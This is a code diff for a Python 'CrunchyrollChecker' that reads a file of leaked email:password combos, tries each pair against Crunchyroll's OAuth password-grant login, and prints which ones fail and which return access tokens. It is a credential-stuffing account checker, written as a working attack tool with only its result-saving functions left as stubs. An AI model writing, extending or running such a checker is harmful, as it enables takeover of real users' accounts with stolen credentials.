@@ -2,7 +2,16 @@
 
 
 ### Importing
-from urllib import request, parse
+from urllib import (
+    request,
+    parse,
+    error
+)
+import re, json
+
+
+### Some Global Variable
+regexEmailPassCombo = '[\w\.]+@[\w\.]+:[\S]+'
 
 
 class CrunchyrollChecker:
@@ -18,28 +27,48 @@ class CrunchyrollChecker:
             "grant_type": "password",
             "scope": "offline_access"
         }
-        print("lol")
+        self.filename = filename
+
+    def checker(self):
+        file = open(self.filename)
+        for line in file.readlines():
+            loginDetail = self._filterEmailPass(line)
+            if loginDetail:
+                self._tryToLogin(self.email, self.password)
+            else:
+                continue
+        file.close()
     
     def _makeRequest(
         self,
         url : str,
         headers : dict = None,
-        data : dict = None,
-        param = None
+        data : dict = None
         ):
         data = parse.urlencode(data).encode()
         req = request.Request(
             url,
             headers = headers,
-            data = data,
-            param = param
+            data = data
         )
-        self.res = request.urlopen(req)
-
-        self.res = self.res.read()
-        self.res = self.res.decode('utf-8')
-        self.res = dict(self.res)
-        print(self.res)
+        try:
+            self.res = request.urlopen(req)
+        except error.HTTPError as e:
+            if e.code == 401:
+                print(f'{self.email}:{self.password} Wrong!')
+            else:
+                print(e)
+        except Exception as e:
+            print(e)
+        else:
+            self.res = self.res.read()
+            self.res = self.res.decode('utf-8')
+            self.res = json.loads(self.res)
+            if self.res['access_token']:
+                print(self.res)
+            else:
+                print(f'{self.email}:{self.password} Something went wrong!')
+                print(self.res)
     
     def _tryToLogin(
         self,
@@ -57,6 +86,20 @@ class CrunchyrollChecker:
             data
         )
     
-    def checker(self):
-        self._tryToLogin
+    def _filterEmailPass(self, line):
+        loginDetail = re.findall(regexEmailPassCombo, line)
+        if loginDetail:
+            self.email, self.password = loginDetail[0].split(':')
+            return True
+        else:
+            return None
+    
+    def _resultFile(self):
+        pass
+
+    def _resultSaving(self, result = None):
+        if result:
+            pass
+        else:
+            pass
 
